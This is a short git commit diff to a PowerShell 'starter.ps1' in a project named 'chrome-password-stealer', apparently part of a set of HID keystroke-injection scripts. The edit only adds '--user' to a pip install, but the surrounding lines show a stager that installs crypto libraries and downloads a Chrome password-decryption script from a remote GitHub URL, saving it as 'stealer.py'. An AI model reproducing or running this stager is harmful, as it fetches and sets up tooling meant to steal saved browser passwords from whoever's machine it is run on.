e29867966e9156a0405f859987bf65a2fc7a9733
simen64 <97337442+simen64@users.noreply.github.com>
2023-09-28 08:21:03 +0200

    Update starter.ps1 added --user to test

--- chrome-password-stealer/starter.ps1
+++ chrome-password-stealer/starter.ps1
@@ -2,7 +2,7 @@ cd $env:USERPROFILE\Documents
 
 #$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
 
-py -m pip install pycryptodomex pywin32
+py -m pip install pycryptodomex pywin32 --user
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
 
